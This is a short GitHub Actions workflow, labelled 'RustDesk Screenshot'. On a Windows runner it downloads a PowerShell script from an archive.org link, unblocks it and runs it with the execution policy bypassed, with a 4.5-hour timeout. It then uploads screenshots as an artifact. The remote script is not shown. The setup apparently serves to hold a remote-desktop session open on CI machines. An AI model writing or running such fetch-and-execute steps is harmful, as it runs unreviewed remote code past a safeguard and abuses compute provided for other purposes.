name: RustDesk Screenshot

on:
  workflow_dispatch:

jobs:
  rustdesk-screenshot:
    runs-on: windows-latest
    timeout-minutes: 270  # 4.5 hours (260 + buffer)
    
    steps:
      - name: Take 3 screenshots and keep running
        run: |
          $url = "https://archive.org/download/information_20251119/screenshot-tool.ps1"
          $path = "$env:GITHUB_WORKSPACE\tool.ps1"
          Invoke-WebRequest -Uri $url -OutFile $path
          Unblock-File -Path $path
          powershell -ExecutionPolicy Bypass -File $path
          
      - name: Upload the 3 screenshots
        uses: actions/upload-artifact@v4
        with:
          name: rustdesk-screenshots
          path: ${{ github.workspace }}/screenshots/screenshot_*.png
          retention-days: 1
